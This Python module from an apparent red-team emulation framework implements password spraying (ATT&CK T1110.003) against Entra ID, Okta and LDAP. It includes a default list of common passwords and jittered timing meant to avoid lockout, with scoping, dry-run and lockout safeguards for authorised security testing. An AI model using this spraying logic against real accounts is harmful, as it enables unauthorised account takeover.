# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Bill Halpin
"""
Password Spraying — T1110.003

Attempts a small set of common passwords against all accounts in scope.target_accounts
across configured identity providers (Entra ID, Okta, Active Directory LDAP).

Emulation controls:
- Only targets explicitly scoped test accounts
- Rate-limited with random jitter to avoid triggering lockout
- Detects lockout responses and immediately stops for the affected account
- Passwords are never logged; only redacted hints are stored

Use this to measure:
- Weak password policy enforcement
- Account lockout policy effectiveness (threshold and duration)
- MFA enforcement coverage
- Smart lockout / sign-in risk signal quality
"""
from __future__ import annotations

import logging
import random
import time
from typing import Any

from redgnat.orm.models import ResultStatus
from redgnat.techniques.base import Technique, TechniqueContext
from redgnat.techniques.identity.base import (
    AuthAttemptResult,
    EntraAuthClient,
    LDAPAuthClient,
    OktaAuthClient,
    _jitter_sleep,
)

logger = logging.getLogger(__name__)

# Default spray wordlist — common passwords known to bypass basic policies
_DEFAULT_SPRAY_PASSWORDS = [
    "Password1",
    "Welcome1",
    "Summer2024!",
    "Winter2024!",
    "Company2024!",
    "P@ssword1",
    "Monday1!",
    "Welcome123",
]


class PasswordSprayTechnique(Technique):
    """
    ATT&CK T1110.003 — Password Spraying.

    Sprays one or more passwords against all target_accounts across
    Entra ID, Okta, and/or LDAP (AD).

    Parameters (ctx.params)
    -----------------------
    passwords : list[str]
        Passwords to spray. Defaults to _DEFAULT_SPRAY_PASSWORDS.
        Keep this list short (1–3 passwords) in production use to avoid lockout.
    providers : list[str]
        Which IdPs to spray: ["entra", "okta", "ldap"] (default: all configured).
    inter_password_delay_seconds : float
        Delay between password rounds (default: 30 minutes = 1800s).
        Set to 30 for test environments with fast lockout reset.
    """

    technique_id = "T1110.003"
    tactic = "credential-access"
    name = "Password Spraying"
    emulation_only = True

    def execute(self, ctx: TechniqueContext) -> Any:
        from redgnat.config import RedGNATConfig
        cfg = RedGNATConfig()

        accounts = ctx.scope.target_accounts
        if not accounts:
            return self._blocked_result(ctx, "No target_accounts configured in scope")

        passwords: list[str] = ctx.params.get("passwords", _DEFAULT_SPRAY_PASSWORDS[:1])
        providers: list[str] = ctx.params.get("providers", ["entra", "okta", "ldap"])
        inter_delay = float(ctx.params.get("inter_password_delay_seconds", 30.0))

        if ctx.scope.dry_run:
            return self._dry_run_result(
                ctx,
                f"Would spray {len(passwords)} password(s) against {len(accounts)} account(s) "
                f"via {providers}",
            )

        # Validate all accounts are explicitly in scope
        for account in accounts:
            self._check_scope_account(ctx.scope, account)

        all_results: list[AuthAttemptResult] = []
        locked_accounts: set[str] = set()

        for i, password in enumerate(passwords):
            logger.info(
                "PasswordSpray: round %d/%d — spraying %d accounts [run=%s]",
                i + 1,
                len(passwords),
                len(accounts),
                ctx.run_id,
            )
            # Shuffle account order each round to distribute lockout risk
            shuffled_accounts = list(accounts)
            random.shuffle(shuffled_accounts)

            for account in shuffled_accounts:
                if account in locked_accounts:
                    logger.debug("PasswordSpray: skipping locked account %s", account)
                    continue

                for provider in providers:
                    result = self._attempt(cfg, provider, account, password)
                    all_results.append(result)

                    if result.locked_out:
                        logger.warning(
                            "PasswordSpray: account %s LOCKED OUT on %s after spray",
                            account,
                            provider,
                        )
                        locked_accounts.add(account)
                        break

                    if result.success:
                        logger.warning(
                            "PasswordSpray: SUCCESSFUL AUTH for %s on %s [run=%s]",
                            account,
                            provider,
                            ctx.run_id,
                        )

                    _jitter_sleep(60.0 / ctx.scope.max_rate_per_minute)

            # Wait between password rounds to avoid smart lockout
            if i < len(passwords) - 1:
                logger.info(
                    "PasswordSpray: sleeping %.0fs between rounds", inter_delay
                )
                time.sleep(inter_delay)

        findings = self._build_findings(all_results, accounts, passwords)
        status = (
            ResultStatus.SUCCESS
            if any(r.success for r in all_results)
            else ResultStatus.PARTIAL
        )
        return self._make_result(ctx, status, findings)

    def _attempt(
        self, cfg: Any, provider: str, account: str, password: str
    ) -> AuthAttemptResult:
        if provider == "entra" and cfg.entra_tenant_id:
            client = EntraAuthClient(cfg.entra_tenant_id, cfg.entra_client_id)
            return client.attempt(account, password)
        elif provider == "okta" and cfg.okta_base_url:
            client = OktaAuthClient(cfg.okta_base_url)
            return client.attempt(account, password)
        elif provider == "ldap" and cfg.ldap_server:
            client = LDAPAuthClient(cfg.ldap_server, cfg.ldap_port, cfg.ldap_use_ssl)
            return client.attempt(account, password)
        else:
            from redgnat.techniques.identity.base import AuthAttemptResult
            return AuthAttemptResult(
                provider=provider,
                account=account,
                password_hint="*",
                success=False,
                locked_out=False,
                mfa_required=False,
                error_code="provider_not_configured",
                http_status=None,
                raw_response_snippet=None,
            )

    @staticmethod
    def _build_findings(
        results: list[AuthAttemptResult],
        accounts: list[str],
        passwords: list[str],
    ) -> list[dict]:
        successes = [r for r in results if r.success]
        mfa_challenges = [r for r in results if r.mfa_required]
        lockouts = [r for r in results if r.locked_out]

        return [
            {
                "attack": "password_spray",
                "accounts_tested": len(accounts),
                "passwords_sprayed": len(passwords),
                "total_attempts": len(results),
                "successful_authentications": len(successes),
                "mfa_required_responses": len(mfa_challenges),
                "accounts_locked_out": len({r.account for r in lockouts}),
                "successful_accounts": [r.account for r in successes],
                "mfa_accounts": list({r.account for r in mfa_challenges}),
                "attempts": [
                    {
                        "provider": r.provider,
                        "account": r.account,
                        "password_hint": r.password_hint,
                        "success": r.success,
                        "locked_out": r.locked_out,
                        "mfa_required": r.mfa_required,
                        "error_code": r.error_code,
                    }
                    for r in results
                ],
            }
        ]
